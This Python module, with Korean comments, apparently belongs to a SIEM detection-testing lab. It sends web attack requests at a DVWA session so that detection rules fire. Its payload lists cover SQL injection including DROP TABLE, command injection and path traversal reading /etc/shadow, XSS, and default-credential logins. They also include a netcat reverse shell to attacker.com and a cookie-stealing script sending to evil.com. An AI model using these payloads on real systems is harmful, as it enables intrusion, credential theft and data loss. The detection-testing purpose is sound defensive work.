"""
Detection Rule Trigger Module
탐지 룰 트리거를 위한 공격 모듈
"""

import time
import random
from utils.logger import log_attack

# 탐지 룰별 공격 패턴
DETECTION_ATTACKS = {
    'recon_404': {
        'name': 'BEHAVIOR-RECON-404 / WEB-404-001',
        'description': '404 응답을 통한 정찰 활동',
        'attacks': [
            '/admin',
            '/administrator',
            '/wp-admin',
            '/phpmyadmin',
            '/backup.sql',
            '/config.php',
            '/.git/config',
            '/.env',
            '/api/v1/users',
            '/test.php',
            '/shell.php',
            '/backdoor.php',
            '/.htaccess',
            '/web.config',
            '/robots.txt.bak',
            '/database.sql',
            '/dump.sql',
            '/backup.zip',
            '/site.zip',
            '/wwwroot.zip'
        ]
    },
    'auth_abuse': {
        'name': 'WEB-AUTH-001',
        'description': '인증 남용 시도',
        'attacks': [
            '/login.php?username=admin&password=password',
            '/login.php?username=admin&password=123456',
            '/login.php?username=root&password=root',
            '/login.php?username=admin&password=admin123',
            '/login.php?username=test&password=test',
            '/admin/login?user=admin&pass=admin',
            '/wp-login.php?log=admin&pwd=password',
            '/user/login?name=admin&pass=12345',
            '/signin?email=admin@admin.com&password=password',
            '/authenticate?uid=admin&pwd=qwerty'
        ]
    },
    'command_injection': {
        'name': 'WEB-CMD-001',
        'description': '명령어 주입 공격',
        'attacks': [
            '/index.php?page=;cat%20/etc/passwd',
            '/cmd.php?cmd=ls%20-la',
            '/shell.php?c=whoami',
            '/exec.php?command=id',
            '/ping.php?ip=127.0.0.1;ls',
            '/test.php?host=localhost|whoami',
            '/api.php?action=test;cat%20/etc/shadow',
            '/run.php?cmd=uname%20-a',
            '/execute.php?code=system("ls")',
            '/backdoor.php?cmd=nc%20-e%20/bin/bash%20attacker.com%204444'
        ]
    },
    'path_traversal': {
        'name': 'WEB-PATH-001',
        'description': '경로 탐색 및 LFI 공격',
        'attacks': [
            '/index.php?page=../../../etc/passwd',
            '/download.php?file=../../../../etc/shadow',
            '/include.php?file=../../../../../windows/win.ini',
            '/read.php?f=....//....//....//etc/passwd',
            '/view.php?page=..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '/load.php?template=../../../../proc/self/environ',
            '/display.php?file=../../../var/log/apache2/access.log',
            '/show.php?doc=php://filter/convert.base64-encode/resource=/etc/passwd',
            '/get.php?path=file:///etc/passwd',
            '/fetch.php?url=../../../../../../etc/hosts'
        ]
    },
    'web_scanning': {
        'name': 'WEB-SCAN-001',
        'description': '웹 스캐닝 활동',
        'attacks': [
            '/.git/',
            '/.svn/',
            '/wp-content/',
            '/wp-includes/',
            '/administrator/',
            '/admin/',
            '/backup/',
            '/backups/',
            '/temp/',
            '/tmp/',
            '/test/',
            '/dev/',
            '/_vti_bin/',
            '/cgi-bin/',
            '/scripts/',
            '/aspnet_client/',
            '/phpmyadmin/',
            '/mysql/',
            '/myadmin/',
            '/dbadmin/'
        ]
    },
    'sql_injection': {
        'name': 'WEB-SQLI-001',
        'description': 'SQL 인젝션 공격',
        'attacks': [
            "/index.php?id=1'%20OR%20'1'='1",
            "/product.php?id=1%20UNION%20SELECT%20NULL--",
            "/login.php?user=admin'--",
            "/search.php?q=test'%20AND%201=1--",
            "/view.php?id=1%20OR%201=1",
            "/page.php?id=1'%20UNION%20ALL%20SELECT%201,2,3--",
            "/item.php?id=1%20AND%20SLEEP(5)--",
            "/user.php?id=1'%20OR%20'1'='1'%20/*",
            "/api.php?id=1;DROP%20TABLE%20users--",
            "/data.php?id=1'%20UNION%20SELECT%20database()--"
        ]
    },
    'slow_request': {
        'name': 'WEB-TIMEOUT-001',
        'description': 'Slowloris 스타일 공격',
        'attacks': [
            # Slowloris는 불완전한 HTTP 요청을 보내는 것이므로
            # 여기서는 타임아웃을 유발하는 요청들
            '/slow.php?delay=30',
            '/timeout.php?wait=60',
            '/sleep.php?time=45',
            '/wait.php?seconds=30',
            '/delay.php?ms=30000'
        ]
    },
    'suspicious_ua': {
        'name': 'WEB-UA-001',
        'description': '의심스러운 User-Agent',
        'user_agents': [
            'sqlmap/1.0-dev-nongit-20150909',
            'Nikto/2.1.5',
            'Mozilla/5.0 (compatible; Nmap Scripting Engine)',
            'Mozilla/5.0 (compatible; Baiduspider/2.0)',
            'masscan/1.0',
            'WPScan v3.8.7',
            'Acunetix-Audit',
            'OpenVAS',
            'Burp Scanner',
            'OWASP ZAP',
            'w3af.org',
            'Metasploit',
            'sqlninja-0.2.999',
            'havij',
            'DataCha0s/2.0'
        ]
    },
    'xss_attack': {
        'name': 'WEB-XSS-001',
        'description': 'Cross-Site Scripting 공격',
        'attacks': [
            '/search.php?q=<script>alert(1)</script>',
            '/comment.php?text=<img src=x onerror=alert(1)>',
            '/profile.php?name=<svg onload=alert(document.cookie)>',
            '/input.php?data=<iframe src=javascript:alert(1)>',
            '/form.php?value=<body onload=alert(1)>',
            '/page.php?content=<script>document.location="http://evil.com/steal.php?c="+document.cookie</script>',
            '/test.php?param=<img src="x" onerror="alert(String.fromCharCode(88,83,83))">',
            '/vuln.php?in=<object data="javascript:alert(1)">',
            '/xss.php?payload=<video><source onerror="alert(1)">',
            '/reflect.php?data=<input onfocus=alert(1) autofocus>'
        ]
    }
}

def run_detection_trigger(session, attack_types=None, delay=1):
    """
    탐지 룰 트리거 공격 실행

    Args:
        session: DVWA 세션
        attack_types: 실행할 공격 유형 리스트 (None이면 모두 실행)
        delay: 요청 간 지연 시간

    Returns:
        dict: 공격 결과
    """
    results = {
        'success': False,
        'attempts': 0,
        'triggered_rules': [],
        'details': {}
    }

    if attack_types is None:
        attack_types = list(DETECTION_ATTACKS.keys())

    print("\n  [*] ===========================================")
    print("  [*] Detection Rule Trigger Attacks")
    print("  [*] 탐지 룰 트리거를 위한 공격 시작")
    print("  [*] ===========================================\n")

    for attack_type in attack_types:
        if attack_type not in DETECTION_ATTACKS:
            continue

        attack_info = DETECTION_ATTACKS[attack_type]
        print(f"\n  [*] {attack_info['name']} - {attack_info['description']}")

        if attack_type == 'suspicious_ua':
            # User-Agent 기반 공격
            for ua in attack_info['user_agents']:
                results['attempts'] += 1
                try:
                    # 임시로 User-Agent 변경
                    old_ua = session.session.headers.get('User-Agent', '')
                    session.session.headers['User-Agent'] = ua

                    # 간단한 요청 수행
                    response = session.get_page('/')

                    if response.status_code > 0:
                        print(f"    [+] User-Agent 공격: {ua[:50]}...")
                        results['triggered_rules'].append(attack_info['name'])

                        log_attack(
                            'DETECTION_TRIGGER_UA',
                            'SUCCESS',
                            f"Rule: {attack_info['name']}, UA: {ua}",
                            response.status_code,
                            len(response.text)
                        )

                    # User-Agent 복원
                    session.session.headers['User-Agent'] = old_ua
                    time.sleep(delay)

                except Exception as e:
                    print(f"    [-] 오류: {str(e)}")

        elif attack_type == 'slow_request':
            # Slowloris 스타일 공격 시뮬레이션
            for path in attack_info['attacks']:
                results['attempts'] += 1
                try:
                    print(f"    [*] Slow request 시도: {path}")
                    # 실제로는 불완전한 요청을 보내야 하지만
                    # 여기서는 타임아웃을 유발하는 경로 접근
                    response = session.get_page(path)

                    if response.status_code > 0:
                        results['triggered_rules'].append(attack_info['name'])

                    time.sleep(delay * 2)  # Slow attack이므로 더 긴 딜레이

                except Exception as e:
                    print(f"    [+] Timeout 유발 (정상): {str(e)}")
                    results['triggered_rules'].append(attack_info['name'])

        else:
            # 일반 HTTP 요청 기반 공격
            attacks = attack_info.get('attacks', [])
            triggered = False

            for attack_path in attacks[:5]:  # 각 유형당 5개씩만
                results['attempts'] += 1
                try:
                    response = session.get_page(attack_path)

                    print(f"    [>] {attack_path[:60]}... [{response.status_code}]")

                    if response.status_code in [200, 404, 403, 500]:
                        if not triggered:
                            results['triggered_rules'].append(attack_info['name'])
                            triggered = True

                    log_attack(
                        f'DETECTION_TRIGGER_{attack_type.upper()}',
                        'ATTEMPT',
                        f"Rule: {attack_info['name']}, Path: {attack_path}",
                        response.status_code,
                        len(response.text) if response.text else 0
                    )

                    time.sleep(delay)

                except Exception as e:
                    print(f"    [-] 오류: {str(e)}")

        # 각 공격 유형 간 추가 딜레이
        time.sleep(delay * 2)

    # 결과 요약
    print(f"\n  {'='*60}")
    print(f"  탐지 룰 트리거 결과")
    print(f"  {'='*60}")
    print(f"\n  총 공격 시도: {results['attempts']}회")
    print(f"  트리거된 룰: {len(set(results['triggered_rules']))}개")

    if results['triggered_rules']:
        print(f"\n  [🚨] 다음 탐지 룰이 트리거될 것으로 예상:")
        for rule in set(results['triggered_rules']):
            print(f"     ✓ {rule}")
        results['success'] = True

    print(f"\n  [💡] SIEM에서 Apache Access 로그를 확인하세요!")

    return results

def run_all_detection_triggers(session):
    """모든 탐지 룰 트리거 실행"""
    print("\n[!] 모든 탐지 룰을 트리거합니다...")
    print("[!] SIEM에서 알림이 대량 발생할 수 있습니다!")

    return run_detection_trigger(session, attack_types=None, delay=1)

def run_specific_detection_trigger(session, rule_name):
    """특정 탐지 룰만 트리거"""
    rule_mapping = {
        'recon': ['recon_404'],
        'auth': ['auth_abuse'],
        'cmd': ['command_injection'],
        'path': ['path_traversal'],
        'scan': ['web_scanning'],
        'sql': ['sql_injection'],
        'slow': ['slow_request'],
        'ua': ['suspicious_ua'],
        'xss': ['xss_attack']
    }

    attack_types = rule_mapping.get(rule_name.lower(), [rule_name])
    return run_detection_trigger(session, attack_types=attack_types, delay=1)